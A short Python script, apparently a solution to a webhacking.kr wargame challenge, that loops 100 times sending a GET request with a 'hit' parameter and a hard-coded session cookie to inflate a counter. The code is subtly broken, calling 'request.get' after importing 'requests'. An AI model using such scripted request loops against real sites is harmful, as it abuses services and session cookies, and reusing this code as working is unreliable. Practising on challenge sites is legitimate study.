import urllib
import requests

url = "https://webhacking.kr/challenge/code-5/"
header = {'Cookie': 'PHPSESSID=mc2fapoen1sfdbg9692cjjrea8'}

for i in range(100):
    param = "?hit=gnbon"
    r = request.get(url+param, headers = header)